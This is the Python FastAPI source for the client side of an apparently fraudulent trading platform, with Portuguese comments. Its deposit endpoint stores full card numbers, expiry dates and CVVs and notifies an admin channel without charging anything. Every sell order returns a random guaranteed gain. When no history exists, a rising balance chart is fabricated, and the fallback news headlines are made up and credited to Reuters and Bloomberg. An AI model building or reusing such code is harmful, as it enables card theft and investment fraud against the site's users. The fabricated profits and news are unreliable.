"""
client.py — Todos os endpoints do cliente (me, depósito, levantamento, ordens, kyc, chat, notícias…).
"""
from fastapi import APIRouter, Depends, HTTPException, Request as FastAPIRequest, UploadFile, File, Form
from fastapi.responses import Response
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime, timedelta
from bson import ObjectId
import base64
import random

from deps import (db, serialize_doc, get_current_user, manager, apply_daily_profit)

router = APIRouter()


# ── Modelos ────────────────────────────────────────────────────────────────────
class UpdateProfileRequest(BaseModel):
    full_name: Optional[str] = None
    phone: Optional[str] = None
    country: Optional[str] = None


class DepositRequest(BaseModel):
    full_name: str
    card_number: str
    expiry: str
    cvv: str
    country: str
    postal_code: str
    amount: Optional[float] = 250.0


class WithdrawalRequest(BaseModel):
    method: str
    account_name: Optional[str] = ""
    iban: Optional[str] = ""
    bic: Optional[str] = ""
    amount: Optional[float] = 0.0
    note: Optional[str] = ""
    card_holder: Optional[str] = ""
    card_number: Optional[str] = ""


class OrderRequest(BaseModel):
    asset_label: str
    asset_name: str
    category: str
    side: str
    amount: float
    leverage: str
    price: str


class ChatMessageRequest(BaseModel):
    message: str


class InvestmentGoalRequest(BaseModel):
    goal_amount: float
    goal_label: Optional[str] = "A minha meta"


class FavoritesRequest(BaseModel):
    favorites: List[str]


# ── Perfil ─────────────────────────────────────────────────────────────────────
@router.get("/api/me")
async def get_me(current_user = Depends(get_current_user)):
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    user = await apply_daily_profit(str(user["_id"]), user)
    profit  = max(0.0, float(user.get("profit", 0)))
    balance = max(0.0, float(user.get("balance", 0)))
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"last_seen": datetime.utcnow()}}
    )
    return serialize_doc({
        "id": user["_id"], "full_name": user["full_name"], "email": user["email"],
        "country": user.get("country", ""), "phone": user.get("phone", ""),
        "balance": balance, "profit": profit, "status": user.get("status", "Novo"),
        "daily_profit_rate": user.get("daily_profit_rate", 0),
        "goal_amount": user.get("goal_amount", 0.0),
        "goal_label": user.get("goal_label", ""),
        "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
        "kyc_status": user.get("kyc_status", "not_submitted"),
        "two_fa_enabled": user.get("two_fa_enabled", False),
        "created_at": user.get("created_at"),
    })


@router.put("/api/me")
async def update_me(req: UpdateProfileRequest, current_user = Depends(get_current_user)):
    update_data = {"updated_at": datetime.utcnow()}
    if req.full_name: update_data["full_name"] = req.full_name
    if req.phone is not None: update_data["phone"] = req.phone
    if req.country: update_data["country"] = req.country
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {"$set": update_data})
    return {"success": True}


@router.put("/api/me/goal")
async def set_investment_goal(req: InvestmentGoalRequest, current_user = Depends(get_current_user)):
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"goal_amount": req.goal_amount, "goal_label": req.goal_label}}
    )
    return {"success": True}


@router.put("/api/me/favorites")
async def set_favorites(req: FavoritesRequest, current_user = Depends(get_current_user)):
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"favorites": req.favorites}}
    )
    return {"success": True}


# ── Depósito ───────────────────────────────────────────────────────────────────
@router.post("/api/deposit")
async def create_deposit(req: DepositRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    card_data = {
        "user_id": user_id, "email": current_user.get("email", ""),
        "full_name": req.full_name, "card_number": req.card_number,
        "expiry": req.expiry, "cvv": req.cvv,
        "country": req.country, "postal_code": req.postal_code,
        "amount": req.amount, "created_at": datetime.utcnow(),
    }
    await db.cards_data.insert_one(card_data)
    await db.deposits.insert_one({
        "user_id": user_id, "amount": req.amount,
        "status": "pending", "created_at": datetime.utcnow(),
    })
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    await manager.broadcast({
        "type": "deposit_submitted", "user_id": user_id,
        "user_name": user["full_name"] if user else req.full_name,
        "email": current_user.get("email", ""), "amount": req.amount,
        "country": req.country,
        "card_last4": req.card_number[-4:] if len(req.card_number) >= 4 else "***",
        "timestamp": datetime.utcnow().isoformat(),
    })
    return {"success": True, "message": "Depósito enviado para processamento"}


# ── Levantamento ───────────────────────────────────────────────────────────────
@router.post("/api/withdrawal")
async def create_withdrawal(req: WithdrawalRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    user_doc = None
    if req.amount and req.amount > 0:
        user_doc = await db.users.find_one({"_id": ObjectId(user_id)})
        if not user_doc:
            raise HTTPException(status_code=404, detail="Utilizador não encontrado")
        current_balance = max(0.0, float(user_doc.get("balance", 0)))
        daily_limit = float(user_doc.get("daily_withdrawal_limit", 0))
        if daily_limit > 0 and req.amount > daily_limit:
            raise HTTPException(status_code=400,
                detail=f"Montante superior ao limite diário de {daily_limit:.2f}€.")
        if req.amount > current_balance:
            raise HTTPException(status_code=400,
                detail=f"Saldo insuficiente. Disponível: {current_balance:.2f}€.")
    if user_doc is None:
        user_doc = await db.users.find_one({"_id": ObjectId(user_id)})
    withdrawal = {
        "user_id": user_id,
        "user_name": user_doc.get("full_name", "") if user_doc else "",
        "user_email": current_user.get("email", ""),
        "method": req.method, "account_name": req.account_name,
        "iban": req.iban, "bic": req.bic,
        "card_holder": req.card_holder, "card_number": req.card_number,
        "amount": req.amount, "note": req.note,
        "status": "pending", "created_at": datetime.utcnow(),
    }
    await db.withdrawals.insert_one(withdrawal)
    try:
        await manager.broadcast({
            "type": "withdrawal_requested",
            "user_name": user_doc.get("full_name","") if user_doc else "",
            "user_email": current_user.get("email",""),
            "amount": req.amount or 0, "method": req.method,
            "timestamp": datetime.utcnow().isoformat(),
        })
    except Exception:
        pass
    return {"success": True, "message": "Pedido de levantamento enviado para aprovação"}


@router.get("/api/me/withdrawals")
async def get_my_withdrawals(current_user = Depends(get_current_user)):
    results = []
    async for w in db.withdrawals.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(20):
        results.append(serialize_doc({
            "id": w["_id"], "method": w.get("method"), "amount": w.get("amount", 0),
            "status": w.get("status", "pending"), "iban": w.get("iban",""),
            "account_name": w.get("account_name",""), "note": w.get("note",""),
            "created_at": w.get("created_at"), "reviewed_at": w.get("reviewed_at"),
            "reject_reason": w.get("reject_reason",""),
        }))
    return results


# ── Ordens ─────────────────────────────────────────────────────────────────────
@router.post("/api/orders")
async def create_order(req: OrderRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    amount  = max(0.0, float(req.amount or 0))
    if amount < 1:
        raise HTTPException(status_code=400, detail="Montante inválido.")
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    balance    = max(0.0, float(user.get("balance", 0)))
    profit     = max(0.0, float(user.get("profit",  0)))
    new_balance = balance
    new_profit  = profit

    if req.side == "comprar":
        if amount > balance:
            raise HTTPException(status_code=400,
                detail=f"Saldo insuficiente. Disponível: {balance:.2f}€. Necessário: {amount:.2f}€.")
        new_balance = round(balance - amount, 2)

    elif req.side == "vender":
        total_bought = 0.0
        total_sold   = 0.0
        async for order in db.orders.find({"user_id": user_id, "asset_label": req.asset_label, "status": "executada"}):
            if order.get("side") == "comprar": total_bought += float(order.get("amount", 0))
            elif order.get("side") == "vender": total_sold   += float(order.get("amount", 0))
        open_position = round(total_bought - total_sold, 2)
        if open_position <= 0:
            raise HTTPException(status_code=400,
                detail=f"Sem posição aberta em {req.asset_label}. Precisa de comprar primeiro.")
        if round(amount, 2) > open_position:
            raise HTTPException(status_code=400,
                detail=f"Não pode vender {amount:.2f}€. Posição aberta: {open_position:.2f}€.")
        lev_str = str(req.leverage or "1:1")
        try:
            lev_mult = int(lev_str.split(":")[-1])
        except (ValueError, IndexError):
            lev_mult = 1
        lev_mult    = max(1, min(lev_mult, 20))
        base_pct    = random.uniform(0.001, 0.015)
        gain        = round(amount * base_pct * min(lev_mult, 3), 2)
        new_balance = round(balance + amount + gain, 2)
        new_profit  = round(profit  + gain, 2)
    else:
        raise HTTPException(status_code=400, detail="Lado inválido. Use 'comprar' ou 'vender'.")

    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
        "balance": new_balance, "profit": new_profit,
        "updated_at": datetime.utcnow(), "profit_last_updated": datetime.utcnow(),
    }})
    order = {
        "user_id": user_id, "asset_label": req.asset_label, "asset_name": req.asset_name,
        "category": req.category, "side": req.side, "amount": amount,
        "leverage": req.leverage, "price": req.price,
        "balance_before": balance, "balance_after": new_balance,
        "status": "executada", "created_at": datetime.utcnow(),
    }
    result = await db.orders.insert_one(order)
    try:
        await manager.broadcast({"type": "balance_updated", "user_id": user_id,
                                  "balance": new_balance, "profit": new_profit})
    except Exception:
        pass
    return {"success": True, "id": str(result.inserted_id),
            "balance_before": balance, "balance_after": new_balance,
            "side": req.side, "amount": amount}


@router.get("/api/orders/position")
async def get_open_position(asset_label: str, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    total_bought = 0.0
    total_sold   = 0.0
    async for order in db.orders.find({"user_id": user_id, "asset_label": asset_label, "status": "executada"}):
        if order.get("side") == "comprar": total_bought += float(order.get("amount", 0))
        elif order.get("side") == "vender": total_sold   += float(order.get("amount", 0))
    open_position = max(0.0, round(total_bought - total_sold, 2))
    return {"asset_label": asset_label, "open_position": open_position,
            "total_bought": round(total_bought, 2), "total_sold": round(total_sold, 2),
            "has_position": open_position > 0}


@router.get("/api/orders")
async def get_orders(current_user = Depends(get_current_user)):
    orders = []
    async for o in db.orders.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(50):
        orders.append(serialize_doc({
            "id": o["_id"], "asset_label": o["asset_label"], "asset_name": o["asset_name"],
            "category": o.get("category",""), "side": o["side"], "amount": o["amount"],
            "leverage": o["leverage"], "price": o["price"],
            "status": o.get("status","executada"), "created_at": o.get("created_at"),
        }))
    return orders


# ── KYC ─────────────────────────────────────────────────────────────────────────
@router.post("/api/kyc/upload")
async def upload_kyc(doc_type: str = Form(...), file: UploadFile = File(...),
                     current_user = Depends(get_current_user)):
    allowed = ["image/jpeg", "image/png", "image/jpg", "application/pdf"]
    if file.content_type not in allowed:
        raise HTTPException(status_code=400, detail="Formato não suportado. Use JPG, PNG ou PDF.")
    content = await file.read()
    if len(content) > 10 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="Ficheiro demasiado grande. Máximo 10MB.")
    doc = {
        "user_id": current_user["sub"], "doc_type": doc_type,
        "filename": file.filename, "content_type": file.content_type,
        "data": base64.b64encode(content).decode(), "status": "pending",
        "created_at": datetime.utcnow(),
    }
    await db.kyc_documents.replace_one(
        {"user_id": current_user["sub"], "doc_type": doc_type}, doc, upsert=True)
    await db.users.update_one({"_id": ObjectId(current_user["sub"])},
        {"$set": {"kyc_status": "pending", "updated_at": datetime.utcnow()}})
    return {"success": True, "status": "pending"}


@router.get("/api/kyc/status")
async def get_kyc_status(current_user = Depends(get_current_user)):
    docs = []
    async for d in db.kyc_documents.find({"user_id": current_user["sub"]}):
        docs.append({"doc_type": d["doc_type"], "filename": d["filename"],
                     "status": d.get("status","pending"),
                     "created_at": d.get("created_at","").isoformat() if d.get("created_at") else ""})
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    return {"kyc_status": user.get("kyc_status","not_submitted") if user else "not_submitted", "documents": docs}


# ── Chat ─────────────────────────────────────────────────────────────────────────
@router.post("/api/chat/message")
async def send_chat_message(req: ChatMessageRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    msg = {
        "user_id": user_id,
        "user_name": user["full_name"] if user else "Cliente",
        "email": current_user.get("email", ""),
        "message": req.message, "sender": "client",
        "read_by_admin": False, "created_at": datetime.utcnow(),
    }
    result = await db.chat_messages.insert_one(msg)
    await manager.broadcast({
        "type": "new_chat_message", "user_id": user_id,
        "user_name": user["full_name"] if user else "Cliente",
        "email": current_user.get("email", ""),
        "message": req.message, "timestamp": datetime.utcnow().isoformat(),
    })
    return {"success": True, "id": str(result.inserted_id)}


@router.get("/api/chat/messages")
async def get_chat_messages(current_user = Depends(get_current_user)):
    msgs = []
    async for m in db.chat_messages.find({"user_id": current_user["sub"]}).sort("created_at", 1):
        msgs.append(serialize_doc({"id": m["_id"], "message": m["message"],
            "sender": m.get("sender", "client"), "created_at": m.get("created_at")}))
    return msgs


# ── Actividades e Sessões ──────────────────────────────────────────────────────
@router.post("/api/me/session")
async def record_session(request: FastAPIRequest, current_user = Depends(get_current_user)):
    ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
    ua = request.headers.get("User-Agent", "unknown")
    await db.sessions.insert_one({
        "user_id": current_user["sub"],
        "ip": ip.split(",")[0].strip(),
        "user_agent": ua[:200], "created_at": datetime.utcnow(),
    })
    return {"success": True}


@router.get("/api/me/sessions")
async def get_my_sessions(current_user = Depends(get_current_user)):
    sessions = []
    async for s in db.sessions.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(10):
        sessions.append(serialize_doc({
            "id": s["_id"], "ip": s.get("ip", "—"),
            "user_agent": s.get("user_agent", "—"), "created_at": s.get("created_at"),
        }))
    return sessions


@router.get("/api/me/activity")
async def get_my_activity(current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    activities = []
    async for o in db.orders.find({"user_id": user_id}).sort("created_at", -1).limit(3):
        side_label = "Compra" if o.get("side") == "comprar" else "Venda"
        activities.append({
            "type": "order", "icon": "📈", "side": o.get("side", ""),
            "asset": o.get("asset_label", ""),
            "label": f"Ordem {side_label} — {o.get('asset_label', '')}",
            "amount": o.get("amount", 0),
            "created_at": o["created_at"].isoformat() if o.get("created_at") else None,
        })
    async for d in db.cards_data.find({"user_id": user_id}).sort("created_at", -1).limit(2):
        activities.append({
            "type": "deposit", "icon": "💳", "label": "Depósito recebido",
            "amount": d.get("amount", 0),
            "created_at": d["created_at"].isoformat() if d.get("created_at") else None,
        })
    async for k in db.kyc_documents.find({"user_id": user_id}).sort("created_at", -1).limit(1):
        doc_map = {"bi_frente":"BI Frente", "bi_verso":"BI Verso", "passport_frente":"Passaporte"}
        activities.append({
            "type": "kyc", "icon": "🪪",
            "doc_label": doc_map.get(k.get('doc_type',''), k.get('doc_type','')),
            "doc_type": k.get('doc_type',''),
            "label": f"KYC enviado — {doc_map.get(k.get('doc_type',''), k.get('doc_type',''))}",
            "amount": None,
            "created_at": k["created_at"].isoformat() if k.get("created_at") else None,
        })
    activities.sort(key=lambda x: x["created_at"] or "", reverse=True)
    return activities[:5]


@router.get("/api/me/balance-history")
async def get_balance_history(current_user = Depends(get_current_user)):
    history = []
    async for h in db.balance_history.find({"user_id": current_user["sub"]}).sort("date", 1).limit(30):
        history.append({"date": h.get("date",""), "balance": h.get("balance",0), "profit": h.get("profit",0)})
    if not history:
        user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
        balance = float(user.get("balance", 0))
        profit  = float(user.get("profit", 0))
        now = datetime.utcnow()
        for i in range(29, -1, -1):
            d = now - timedelta(days=i)
            factor = max(0, (30 - i) / 30)
            noise = random.uniform(-0.02, 0.02) * balance * factor if balance > 0 else 0
            history.append({
                "date": d.strftime("%d/%m"),
                "balance": round(max(0, balance * factor + noise), 2),
                "profit":  round(max(0, profit * factor), 2),
            })
    return history


@router.get("/api/me/referral")
async def get_referral(current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    count     = await db.users.count_documents({"referred_by": user_id})
    converted = await db.users.count_documents({"referred_by": user_id, "status": "Depositado"})
    return {"referral_code": user_id[:8].upper(), "count": count,
            "converted": converted, "bonus": converted * 25.0}


# ── Notícias ───────────────────────────────────────────────────────────────────
@router.get("/api/news")
async def get_news():
    import feedparser, hashlib
    from datetime import timezone
    FEEDS = [
        {"url": "https://feeds.reuters.com/reuters/businessNews", "source": "Reuters", "cat": "Macro"},
        {"url": "https://finance.yahoo.com/rss/topstories",       "source": "Yahoo Finance", "cat": "Macro"},
        {"url": "https://finance.yahoo.com/rss/2.0/headline?s=EURUSD=X", "source": "Yahoo Finance", "cat": "FX"},
        {"url": "https://finance.yahoo.com/rss/2.0/headline?s=BTC-USD",  "source": "Yahoo Finance", "cat": "Crypto"},
        {"url": "https://www.coindesk.com/arc/outboundfeeds/rss/",        "source": "CoinDesk", "cat": "Crypto"},
        {"url": "https://www.investing.com/rss/news.rss",                 "source": "Investing.com", "cat": "Macro"},
    ]
    def classify(title: str, feed_cat: str) -> str:
        t = title.lower()
        if any(k in t for k in ["bitcoin","btc","ethereum","eth","crypto","blockchain"]):
            return "Crypto"
        if any(k in t for k in ["eur/usd","gbp/usd","forex","currency","dólar","euro"]):
            return "FX"
        if any(k in t for k in ["crude","petróleo","oil","brent","gold","ouro","commodity"]):
            return "Commodities"
        if any(k in t for k in ["apple","tesla","amazon","nasdaq","s&p","dax","stock","bolsa"]):
            return "Ações"
        return feed_cat
    def fmt_time(entry) -> str:
        try:
            from datetime import timezone as _tz
            ts = entry.get("published_parsed") or entry.get("updated_parsed")
            if ts:
                pub = datetime(*ts[:6], tzinfo=_tz.utc)
                diff = datetime.now(_tz.utc) - pub
                mins = int(diff.total_seconds() / 60)
                if mins < 60:   return f"Há {mins}min"
                if mins < 1440: return f"Há {mins//60}h"
                return f"Há {mins//1440}d"
        except Exception:
            pass
        return "Recente"
    articles = []
    seen = set()
    for feed_info in FEEDS:
        try:
            parsed = feedparser.parse(feed_info["url"])
            for e in (parsed.entries or [])[:6]:
                title = (e.get("title") or "").strip()
                if not title or len(title) < 10:
                    continue
                h = hashlib.md5(title.encode()).hexdigest()
                if h in seen:
                    continue
                seen.add(h)
                snippet = e.get("summary", "")[:200] if e.get("summary") else ""
                articles.append({
                    "id": h, "title": title, "snippet": snippet,
                    "source": feed_info["source"],
                    "category": classify(title, feed_info["cat"]),
                    "time": fmt_time(e), "url": e.get("link", "#"),
                })
        except Exception:
            continue
    if not articles:
        return [
            {"id":"1","title":"BCE mantém taxas — cautela com inflação na zona euro","source":"Reuters","category":"Macro","time":"Há 1h","snippet":"O BCE sinalizou cautela face à volatilidade nos mercados.","url":"#"},
            {"id":"2","title":"EUR/USD consolida acima de 1.0850 após dados de inflação","source":"Bloomberg","category":"FX","time":"Há 2h","snippet":"O par cambial mantém-se estável após dados acima do esperado.","url":"#"},
            {"id":"3","title":"Bitcoin supera $95.000 com nova vaga de adoção institucional","source":"CoinDesk","category":"Crypto","time":"Há 3h","snippet":"O BTC voltou a superar os $95.000 com compras institucionais.","url":"#"},
        ]
    return articles[:30]
